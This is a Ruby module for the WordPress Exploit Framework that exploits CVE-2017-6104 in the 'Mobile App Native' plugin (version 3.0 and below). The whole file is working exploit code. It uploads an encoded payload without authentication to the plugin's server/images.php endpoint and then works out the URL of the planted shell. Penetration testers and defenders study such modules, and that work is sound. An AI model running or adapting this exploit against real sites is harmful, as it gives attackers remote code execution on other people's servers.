# frozen_string_literal: true

class Wpxf::Exploit::MobileAppNativeV3ShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'Mobile App Native <= 3.0 Unauthenticated Shell Upload',
      author: [
        'Larry W. Cashdollar', # Discovery and disclosure
        'rastating'            # WPXF module
      ],
      references: [
        ['WPVDB', '8743'],
        ['CVE', '2017-6104'],
        ['URL', 'http://www.vapidlabs.com/advisory.php?v=178']
      ],
      date: 'Feb 27 2017'
    )
  end

  def check
    :unknown
  end

  def plugin_name
    'zen-mobile-app-native'
  end

  def uploader_url
    normalize_uri(wordpress_url_plugins, plugin_name, 'server', 'images.php')
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_file_from_string('file', payload.encoded, payload_name)
    builder
  end

  def uploaded_payload_location
    return nil if upload_result.code != 200 || upload_result.body =~ /Ooops.*/i
    upload_result.body.gsub(/#{plugin_name}\/\/server/, "#{plugin_name}/server").strip
  end
end
